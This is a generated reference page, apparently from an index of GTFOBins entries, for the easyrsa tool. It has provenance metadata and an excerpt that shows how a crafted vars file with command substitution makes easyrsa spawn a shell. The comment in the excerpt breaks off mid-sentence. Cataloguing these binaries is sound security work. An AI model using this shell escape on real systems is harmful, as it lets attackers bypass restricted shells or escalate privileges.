---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# easyrsa

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `easyrsa` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/easyrsa` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for easyrsa covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/easyrsa.md)
- Source verification: [source record](../../sources/gtfobins/easyrsa.md)

## Aliases

- `easyrsa`

## Source Verification

[source record](../../sources/gtfobins/easyrsa.md)

## Evidence Excerpt

```text
_body: ''
_name: easyrsa
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/easyrsa
functions:
shell:
- code: 'echo ''set_var X "$(/bin/sh 1>&0)"'' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file'
comment: This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn
```
